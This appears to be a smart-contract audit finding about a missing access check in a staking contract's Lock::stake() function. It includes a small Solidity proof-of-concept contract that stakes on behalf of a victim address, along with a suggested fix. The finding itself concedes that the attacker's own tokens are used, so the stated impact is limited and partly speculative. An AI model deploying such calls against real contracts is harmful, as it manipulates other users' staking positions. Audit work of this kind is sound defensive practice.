# [S-Medium] No Access Control Check in `Lock:: Stake()` so attacker can call stake on behalf of another user

## Summary
In `Lock:: Stake()`, there is no access control to ensure that whomever is calling stake is only staking
on behalf of themselves.  This can result in an attacker calling stake and shifting the values someone 
has staked via their balance. 

## Vulnerability Detail
An attacker may call stake on behalf of another user.  This will cause that user's balance, rewards, locks, and multipliers to be manipulated and changed.  However, since the IERC20 staking transfer is done from msg.sender ((https://github.com/sherlock-audit/2024-05-gamma-staking/blob/main/StakingV2/src/Lock.sol/?plain=1#L295)) , it is not possible for an attacker to actually stake funds from a user account.  That being said, this type of manipulation of a victim's account could result in other unseen attack vectors.

## Impact
An attacker can stake on behalf of a victim, causing user staked balance and multipliers to change.

## Code Snippet/POC
The attack contract below shows how someone could call the stake contract 
"on behalf" of someone else.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;


contract ExploitStake {
    Lock public targetContract;
    address public victim;

    constructor(address lock, address _victim) {
        targetContract = Lock(lock);
        victim = _victim;
    }

    function exploitStake(uint256 amount, uint256 typeIndex) external {
        // Call the stake function of the target contract on behalf of the victim

        targetContract.stake(amount, victim, typeIndex);
    }
}

```
## Tool used

Manual Review

## Recommendation
To mitigate this issue, adding an access control check in `Lock:: stake()` like the one below is recommended.

```solidity
if (msg.sender != onBehalfOf) {
        // Add your access control logic here
        revert Unauthorized();
    }
```
